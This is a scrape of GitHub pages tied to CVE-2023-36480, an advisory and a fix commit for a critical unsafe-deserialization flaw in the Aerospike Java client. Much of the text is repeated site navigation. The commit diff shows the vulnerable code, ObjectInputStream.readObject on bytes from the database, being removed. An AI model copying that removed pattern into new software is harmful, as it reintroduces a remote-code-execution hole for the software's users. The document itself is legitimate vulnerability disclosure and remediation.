This report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).

### Severity

Critical

### CVE ID

CVE-2023-36480

### Weaknesses

[CWE-502](/advisories?query=cwe%3A502)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6c86e8ba_20250110_224546.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FAsyncRead.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FAsyncRead.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ed899495_20250110_224551.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F02bf28e62fb186f004c82c87b219db2fc5b8262a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F02bf28e62fb186f004c82c87b219db2fc5b8262a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Commit

[Permalink](/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[CVE-2023-36480](https://github.com/advisories/GHSA-jj95-55cr-9597 "CVE-2023-36480") CLIENT-2252 DIsable java runtime serialization/deseria…

[Browse files](/aerospike/aerospike-client-java/tree/02bf28e62fb186f004c82c87b219db2fc5b8262a)
Browse the repository at this point in the history

```
…lization.

Deserialization of java runtime serialized objects has been identified as a security risk by
CodeQL team members [@atorralba](https://github.com/atorralba) (Tony Torralba) and [@joefarebrother](https://github.com/joefarebrother) (Joseph Farebrother).

All existing database objects that are serialized using this serialization format will need to
be converted to a safer format (Aerospike native types, protobuf, msgpack, json, xml ...) using
a previous client version.
```

* Loading branch information

[![@BrianNichols](https://avatars.githubusercontent.com/u/1761530?s=40&v=4)](/BrianNichols)

[BrianNichols](/aerospike/aerospike-client-java/commits?author=BrianNichols "View all commits by BrianNichols")
committed
Aug 7, 2023

1 parent
[aeda98b](/aerospike/aerospike-client-java/commit/aeda98b973a319482b947ebcd034bfe3de98629d)

commit 02bf28e

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**7 additions**
and
**47 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* client/src/com/aerospike/client

  + client/src/com/aerospike/client/Value.java
    [Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc)
  + command

    - client/src/com/aerospike/client/command/Buffer.java
      [Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77)
  + util

    - client/src/com/aerospike/client/util/Packer.java
      [Packer.java](#diff-358b093e614cf440721800580d512243f494f11224161e28bee19d59a3256396)
    - client/src/com/aerospike/client/util/Unpacker.java
      [Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625)

## There are no files selected for viewing

14 changes: 1 addition & 13 deletions

14
[client/src/com/aerospike/client/Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc "client/src/com/aerospike/client/Value.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/02bf28e62fb186f004c82c87b219db2fc5b8262a/client/src/com/aerospike/client/Value.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,8 +16,6 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client; |
|  |  |  |
|  |  | import java.io.ByteArrayOutputStream; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.Arrays; |
|  |  | import java.util.List; |
| Expand Down  Expand Up | | @@ -1020,17 +1018,7 @@ public BlobValue(Object object) { |
|  |  |  |
|  |  | @Override |
|  |  | public int estimateSize() throws AerospikeException.Serialize { |
|  |  | try { |
|  |  | ByteArrayOutputStream bstream = new ByteArrayOutputStream(); |
|  |  | ObjectOutputStream ostream = new ObjectOutputStream(bstream); |
|  |  | ostream.writeObject(object); |
|  |  | ostream.close(); |
|  |  | bytes = bstream.toByteArray(); |
|  |  | return bytes.length; |
|  |  | } |
|  |  | catch (Exception e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | @Override |
| Expand Down | |  |

12 changes: 2 additions & 10 deletions

12
[client/src/com/aerospike/client/command/Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77 "client/src/com/aerospike/client/command/Buffer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/02bf28e62fb186f004c82c87b219db2fc5b8262a/client/src/com/aerospike/client/command/Buffer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,13 +16,12 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.command; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.io.UnsupportedEncodingException; |
|  |  | import java.math.BigInteger; |
|  |  | import java.util.Arrays; |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.ResultCode; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.util.Unpacker; |
|  |  |  |
| Expand Down  Expand Up | | @@ -335,14 +334,7 @@ public static Object bytesToObject(byte[] buf, int offset, int length) |
|  |  | return null; |
|  |  | } |
|  |  |  |
|  |  | try { |
|  |  | ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length); |
|  |  | ObjectInputStream oistream = new ObjectInputStream(bastream); |
|  |  | return oistream.readObject(); |
|  |  | } |
|  |  | catch (Exception e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object deserializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | public static Value bytesToLongValue(byte[] buf, int offset, int len) { |
| Expand Down | |  |

20 changes: 2 additions & 18 deletions

20
[client/src/com/aerospike/client/util/Packer.java](#diff-358b093e614cf440721800580d512243f494f11224161e28bee19d59a3256396 "client/src/com/aerospike/client/util/Packer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/02bf28e62fb186f004c82c87b219db2fc5b8262a/client/src/com/aerospike/client/util/Packer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,16 +16,14 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.util; |
|  |  |  |
|  |  | import java.io.ByteArrayOutputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.ArrayList; |
|  |  | import java.util.List; |
|  |  | import java.util.Map; |
|  |  | import java.util.Map.Entry; |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.ResultCode; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.cdt.MapOrder; |
|  |  | import com.aerospike.client.command.Buffer; |
| Expand Down  Expand Up | | @@ -191,21 +189,7 @@ public void packBytes(byte[] b, int offset, int length) { |
|  |  | } |
|  |  |  |
|  |  | public void packBlob(Object val) throws AerospikeException { |
|  |  | ByteArrayOutputStream bstream = new ByteArrayOutputStream(); |
|  |  |  |
|  |  | try { |
|  |  | ObjectOutputStream ostream = new ObjectOutputStream(bstream); |
|  |  | ostream.writeObject(val); |
|  |  | ostream.close(); |
|  |  | } |
|  |  | catch (IOException ioe) { |
|  |  | throw new AerospikeException.Serialize(ioe); |
|  |  | } |
|  |  |  |
|  |  | byte[] bytes = bstream.toByteArray(); |
|  |  | packByteArrayBegin(bytes.length + 1); |
|  |  | packByte(ParticleType.JBLOB); |
|  |  | packByteArray(bytes, 0, bytes.length); |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | public void packGeoJSON(String val) { |
| Expand Down | |  |

8 changes: 2 additions & 6 deletions

8
[client/src/com/aerospike/client/util/Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625 "client/src/com/aerospike/client/util/Unpacker.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/02bf28e62fb186f004c82c87b219db2fc5b8262a/client/src/com/aerospike/client/util/Unpacker.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,9 +16,7 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.util; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.AbstractMap; |
|  |  | import java.util.ArrayList; |
| Expand All | | @@ -30,6 +28,7 @@ |
|  |  | import java.util.TreeMap; |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.ResultCode; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.command.Buffer; |
|  |  | import com.aerospike.client.command.ParticleType; |
| Expand Down  Expand Up | | @@ -235,10 +234,7 @@ private T unpackBlob(int count) throws IOException, ClassNotFoundException { |
|  |  | break; |
|  |  |  |
|  |  | case ParticleType.JBLOB: |
|  |  | ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count); |
|  |  | ObjectInputStream oistream = new ObjectInputStream(bastream); |
|  |  | val = getJavaBlob(oistream.readObject()); |
|  |  | break; |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object deserializer has been disabled"); |
|  |  |  |
|  |  | case ParticleType.GEOJSON: |
|  |  | val = getGeoJSON(Buffer.utf8ToString(buffer, offset, count)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `02bf28e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F02bf28e62fb186f004c82c87b219db2fc5b8262a) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from support.aerospike.com_741d6fc2_20250110_224555.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from github.com_94021361_20250110_224550.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Futil%2FUnpacker.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Futil%2FUnpacker.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_63d166ca_20250110_224547.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FNettyCommand.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FNettyCommand.java)

